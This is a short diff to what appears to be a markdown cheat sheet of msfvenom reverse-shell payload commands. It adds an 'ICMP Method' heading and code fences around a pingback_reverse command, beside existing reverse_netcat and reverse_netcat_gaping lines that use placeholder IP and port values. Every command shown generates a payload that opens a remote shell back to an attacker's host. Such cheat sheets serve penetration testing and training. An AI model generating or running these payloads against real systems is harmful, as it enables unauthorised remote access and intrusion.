@@ -44,7 +44,11 @@ $ msfvenom -p cmd/unix/reverse_netcat lhost=<IP> lport=<PORT>
 
 ```
 $ msfvenom -p cmd/unix/reverse_netcat_gaping lhost=<IP> lport=<PORT>
+```
 
+### 2.3 - ICMP Method
+
+```
 $ msfvenom -p cmd/unix/pingback_reverse lhost=<IP> lport=<PORT>
 ```
 
